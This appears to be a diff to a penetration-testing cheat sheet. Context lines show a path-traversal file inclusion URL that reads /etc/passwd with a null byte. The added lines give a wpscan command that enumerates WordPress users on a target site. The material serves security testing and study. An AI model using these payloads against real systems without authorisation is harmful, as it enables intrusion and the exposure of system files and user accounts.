@@ -22,3 +22,10 @@ Windows is `C:\windows\system32\drivers\etc\hosts`
 # To attempt to view the /etc/passwd file
 http://host/index.php?page=./../../../../../etc/passwd%00
 ```
+---
+
+### Wordpress
+```
+# Enumerate users on wordpress site
+wpscan targetsite.com --enumerate u
+```
